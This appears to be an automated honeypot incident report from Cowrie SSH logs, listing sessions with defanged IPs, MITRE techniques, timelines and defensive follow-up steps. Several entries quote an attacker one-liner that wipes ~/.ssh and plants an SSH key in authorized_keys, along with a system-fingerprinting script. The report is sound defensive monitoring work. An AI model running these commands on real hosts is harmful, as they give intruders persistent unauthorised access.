| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 04:13:15` | `cowrie.session.connect` |
| `2026-03-12 04:13:15` | `cowrie.client.version` |
| `2026-03-12 04:13:15` | `cowrie.client.kex` |
| `2026-03-12 04:13:17` | `cowrie.login.success` |
| `2026-03-12 04:13:18` | `cowrie.session.params` |
| `2026-03-12 04:13:18` | `cowrie.command.input` |
| `2026-03-12 04:13:18` | `cowrie.command.input` |
| `2026-03-12 04:13:18` | `cowrie.command.input` |
| `2026-03-12 04:13:18` | `cowrie.command.input` |
| `2026-03-12 04:13:19` | `cowrie.log.closed` |
| `2026-03-12 04:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.166.37[.]151` to AbuseIPDB if not already reported
- [ ] Block `188.166.37[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-892cae74fd61

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]99` |
| **First Seen** | 2026-03-12 05:11 |
| **Last Seen** | 2026-03-12 05:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 05:11:00` | `cowrie.session.connect` |
| `2026-03-12 05:11:00` | `cowrie.client.version` |
| `2026-03-12 05:11:00` | `cowrie.client.kex` |
| `2026-03-12 05:11:00` | `cowrie.login.success` |
| `2026-03-12 05:11:01` | `cowrie.session.params` |
| `2026-03-12 05:11:01` | `cowrie.command.input` |
| `2026-03-12 05:11:01` | `cowrie.command.failed` |
| `2026-03-12 05:11:01` | `cowrie.log.closed` |
| `2026-03-12 05:11:01` | `cowrie.session.params` |
| `2026-03-12 05:11:01` | `cowrie.command.input` |
| `2026-03-12 05:11:01` | `cowrie.session.file_download` |
| `2026-03-12 05:11:01` | `cowrie.log.closed` |
| `2026-03-12 05:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]99` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e60c5a9665d9

| Field | Detail |
|---|---|
| **Source IP** | `118.193.39[.]99` |
| **First Seen** | 2026-03-12 05:11 |
| **Last Seen** | 2026-03-12 05:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 05:11:03` | `cowrie.session.connect` |
| `2026-03-12 05:11:03` | `cowrie.client.version` |
| `2026-03-12 05:11:03` | `cowrie.client.kex` |
| `2026-03-12 05:11:03` | `cowrie.login.success` |
| `2026-03-12 05:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.39[.]99` to AbuseIPDB if not already reported
- [ ] Block `118.193.39[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c355aaaad15

| Field | Detail |
|---|---|
| **Source IP** | `185.255.131[.]32` |
| **First Seen** | 2026-03-12 05:44 |
| **Last Seen** | 2026-03-12 05:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 05:44:49` | `cowrie.session.connect` |
| `2026-03-12 05:44:49` | `cowrie.client.version` |
| `2026-03-12 05:44:49` | `cowrie.client.kex` |
| `2026-03-12 05:44:50` | `cowrie.login.success` |
| `2026-03-12 05:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.131[.]32` to AbuseIPDB if not already reported
- [ ] Block `185.255.131[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b246975184

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]116` |
| **First Seen** | 2026-03-12 06:54 |
| **Last Seen** | 2026-03-12 06:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ssh -V` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 06:54:22` | `cowrie.session.connect` |
| `2026-03-12 06:54:22` | `cowrie.client.version` |
| `2026-03-12 06:54:22` | `cowrie.client.kex` |
| `2026-03-12 06:54:22` | `cowrie.login.success` |
| `2026-03-12 06:54:22` | `cowrie.session.params` |
| `2026-03-12 06:54:22` | `cowrie.command.input` |
| `2026-03-12 06:54:22` | `cowrie.log.closed` |
| `2026-03-12 06:54:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]116` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-066fbe5eb4a6

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]116` |
| **First Seen** | 2026-03-12 07:09 |
| **Last Seen** | 2026-03-12 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 07:09:01` | `cowrie.session.connect` |
| `2026-03-12 07:09:01` | `cowrie.client.version` |
| `2026-03-12 07:09:01` | `cowrie.client.kex` |
| `2026-03-12 07:09:01` | `cowrie.login.success` |
| `2026-03-12 07:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]116` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69c0845ec34

| Field | Detail |
|---|---|
| **Source IP** | `112.196.70[.]142` |
| **First Seen** | 2026-03-12 07:15 |
| **Last Seen** | 2026-03-12 07:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 07:15:11` | `cowrie.session.connect` |
| `2026-03-12 07:15:11` | `cowrie.client.version` |
| `2026-03-12 07:15:11` | `cowrie.client.kex` |
| `2026-03-12 07:15:11` | `cowrie.login.success` |
| `2026-03-12 07:15:11` | `cowrie.session.params` |
| `2026-03-12 07:15:11` | `cowrie.command.input` |
| `2026-03-12 07:15:11` | `cowrie.command.failed` |
| `2026-03-12 07:15:12` | `cowrie.log.closed` |
| `2026-03-12 07:15:12` | `cowrie.session.params` |
| `2026-03-12 07:15:12` | `cowrie.command.input` |
| `2026-03-12 07:15:12` | `cowrie.session.file_download` |
| `2026-03-12 07:15:12` | `cowrie.log.closed` |
| `2026-03-12 07:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.196.70[.]142` to AbuseIPDB if not already reported
- [ ] Block `112.196.70[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbab022eddd7

| Field | Detail |
|---|---|
| **Source IP** | `112.196.70[.]142` |
| **First Seen** | 2026-03-12 07:15 |
| **Last Seen** | 2026-03-12 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 07:15:13` | `cowrie.session.connect` |
| `2026-03-12 07:15:13` | `cowrie.client.version` |
| `2026-03-12 07:15:13` | `cowrie.client.kex` |
| `2026-03-12 07:15:13` | `cowrie.login.success` |
| `2026-03-12 07:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.196.70[.]142` to AbuseIPDB if not already reported
- [ ] Block `112.196.70[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-236583edce88

| Field | Detail |
|---|---|
| **Source IP** | `165.227.33[.]201` |
| **First Seen** | 2026-03-12 07:21 |
| **Last Seen** | 2026-03-12 07:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 07:21:32` | `cowrie.session.connect` |
| `2026-03-12 07:21:32` | `cowrie.client.version` |
| `2026-03-12 07:21:32` | `cowrie.client.kex` |
| `2026-03-12 07:21:34` | `cowrie.login.success` |
| `2026-03-12 07:21:35` | `cowrie.session.params` |
| `2026-03-12 07:21:35` | `cowrie.command.input` |
| `2026-03-12 07:21:35` | `cowrie.command.input` |
| `2026-03-12 07:21:35` | `cowrie.command.input` |
| `2026-03-12 07:21:35` | `cowrie.command.input` |
| `2026-03-12 07:21:36` | `cowrie.log.closed` |
| `2026-03-12 07:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.227.33[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.227.33[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-734375bd234d

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]116` |
| **First Seen** | 2026-03-12 07:38 |
| **Last Seen** | 2026-03-12 07:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 07:38:37` | `cowrie.session.connect` |
| `2026-03-12 07:38:37` | `cowrie.client.version` |
| `2026-03-12 07:38:37` | `cowrie.client.kex` |
| `2026-03-12 07:38:37` | `cowrie.login.success` |
| `2026-03-12 07:38:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]116` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aed9801a13ea

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]146` |
| **First Seen** | 2026-03-12 10:06 |
| **Last Seen** | 2026-03-12 10:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 10:06:20` | `cowrie.session.connect` |
| `2026-03-12 10:06:20` | `cowrie.client.version` |
| `2026-03-12 10:06:20` | `cowrie.client.kex` |
| `2026-03-12 10:06:21` | `cowrie.login.success` |
| `2026-03-12 10:06:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]146` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f63d0c38d9f2

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]146` |
| **First Seen** | 2026-03-12 10:20 |
| **Last Seen** | 2026-03-12 10:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 10:20:26` | `cowrie.session.connect` |
| `2026-03-12 10:20:26` | `cowrie.client.version` |
| `2026-03-12 10:20:26` | `cowrie.client.kex` |
| `2026-03-12 10:20:26` | `cowrie.login.success` |
| `2026-03-12 10:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]146` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61377a9d9445

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]200` |
| **First Seen** | 2026-03-12 10:22 |
| **Last Seen** | 2026-03-12 10:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 10:22:53` | `cowrie.session.connect` |
| `2026-03-12 10:22:53` | `cowrie.client.version` |
| `2026-03-12 10:22:53` | `cowrie.client.kex` |
| `2026-03-12 10:22:53` | `cowrie.login.success` |
| `2026-03-12 10:22:53` | `cowrie.direct-tcpip.request` |
| `2026-03-12 10:22:53` | `cowrie.direct-tcpip.data` |
| `2026-03-12 10:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]200` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9650e19060

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]146` |
| **First Seen** | 2026-03-12 10:49 |
| **Last Seen** | 2026-03-12 10:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 10:49:12` | `cowrie.session.connect` |
| `2026-03-12 10:49:12` | `cowrie.client.version` |
| `2026-03-12 10:49:12` | `cowrie.client.kex` |
| `2026-03-12 10:49:12` | `cowrie.login.success` |
| `2026-03-12 10:49:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]146` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eebfa9d8d732

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]146` |
| **First Seen** | 2026-03-12 11:18 |
| **Last Seen** | 2026-03-12 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 11:18:08` | `cowrie.session.connect` |
| `2026-03-12 11:18:08` | `cowrie.client.version` |
| `2026-03-12 11:18:08` | `cowrie.client.kex` |
| `2026-03-12 11:18:09` | `cowrie.login.success` |
| `2026-03-12 11:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]146` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b5f301e0c5c

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-03-12 12:40 |
| **Last Seen** | 2026-03-12 12:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 12:40:49` | `cowrie.session.connect` |
| `2026-03-12 12:40:49` | `cowrie.client.version` |
| `2026-03-12 12:40:49` | `cowrie.client.kex` |
| `2026-03-12 12:40:49` | `cowrie.login.success` |
| `2026-03-12 12:40:50` | `cowrie.session.params` |
| `2026-03-12 12:40:50` | `cowrie.command.input` |
| `2026-03-12 12:40:50` | `cowrie.command.failed` |
| `2026-03-12 12:40:50` | `cowrie.log.closed` |
| `2026-03-12 12:40:50` | `cowrie.session.params` |
| `2026-03-12 12:40:50` | `cowrie.command.input` |
| `2026-03-12 12:40:51` | `cowrie.session.file_download` |
| `2026-03-12 12:40:51` | `cowrie.log.closed` |
| `2026-03-12 12:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8d4f9a8a33e

| Field | Detail |
|---|---|
| **Source IP** | `180.93.172[.]213` |
| **First Seen** | 2026-03-12 12:40 |
| **Last Seen** | 2026-03-12 12:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 12:40:53` | `cowrie.session.connect` |
| `2026-03-12 12:40:53` | `cowrie.client.version` |
| `2026-03-12 12:40:53` | `cowrie.client.kex` |
| `2026-03-12 12:40:54` | `cowrie.login.success` |
| `2026-03-12 12:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.172[.]213` to AbuseIPDB if not already reported
- [ ] Block `180.93.172[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b56f88303245

| Field | Detail |
|---|---|
| **Source IP** | `221.182.17[.]158` |
| **First Seen** | 2026-03-12 12:51 |
| **Last Seen** | 2026-03-12 12:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 12:51:24` | `cowrie.session.connect` |
| `2026-03-12 12:51:24` | `cowrie.client.version` |
| `2026-03-12 12:51:24` | `cowrie.client.kex` |
| `2026-03-12 12:51:25` | `cowrie.login.success` |
| `2026-03-12 12:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.17[.]158` to AbuseIPDB if not already reported
- [ ] Block `221.182.17[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f00b053dbb4c

| Field | Detail |
|---|---|
| **Source IP** | `206.81.1[.]156` |
| **First Seen** | 2026-03-12 13:29 |
| **Last Seen** | 2026-03-12 13:30 |
| **Session Duration** | 68s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 13:29:21` | `cowrie.session.connect` |
| `2026-03-12 13:29:21` | `cowrie.client.version` |
| `2026-03-12 13:29:22` | `cowrie.client.kex` |
| `2026-03-12 13:29:22` | `cowrie.login.success` |
| `2026-03-12 13:30:30` | `cowrie.session.file_upload` |
| `2026-03-12 13:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.81.1[.]156` to AbuseIPDB if not already reported
- [ ] Block `206.81.1[.]156` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ab88b5cd78

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-03-12 14:36 |
| **Last Seen** | 2026-03-12 14:36 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 14:36:49` | `cowrie.session.connect` |
| `2026-03-12 14:36:49` | `cowrie.client.version` |
| `2026-03-12 14:36:49` | `cowrie.client.kex` |
| `2026-03-12 14:36:51` | `cowrie.login.success` |
| `2026-03-12 14:36:51` | `cowrie.session.params` |
| `2026-03-12 14:36:51` | `cowrie.command.input` |
| `2026-03-12 14:36:51` | `cowrie.command.failed` |
| `2026-03-12 14:36:52` | `cowrie.log.closed` |
| `2026-03-12 14:36:52` | `cowrie.session.params` |
| `2026-03-12 14:36:52` | `cowrie.command.input` |
| `2026-03-12 14:36:53` | `cowrie.session.file_download` |
| `2026-03-12 14:36:53` | `cowrie.log.closed` |
| `2026-03-12 14:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a86233fe45

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-03-12 14:36 |
| **Last Seen** | 2026-03-12 14:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-12 14:36:56` | `cowrie.session.connect` |
| `2026-03-12 14:36:56` | `cowrie.client.version` |
| `2026-03-12 14:36:56` | `cowrie.client.kex` |
| `2026-03-12 14:36:58` | `cowrie.login.success` |
| `2026-03-12 14:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.33.210[.]213` to AbuseIPDB if not already reported
- [ ] Block `179.33.210[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `112.248.246[.]234` | **25** | 2026-03-12 00:27 | 2026-03-12 00:33 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `101.227.203[.]162` | **11** | 2026-03-12 00:43 | 2026-03-12 00:58 | 16m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.47.156[.]17` | **11** | 2026-03-12 02:45 | 2026-03-12 03:09 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.219.126[.]124` | **11** | 2026-03-12 05:16 | 2026-03-12 05:45 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.153[.]156` | **11** | 2026-03-12 00:41 | 2026-03-12 00:48 | 19m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `118.193.39[.]99` | **11** | 2026-03-12 05:02 | 2026-03-12 05:25 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
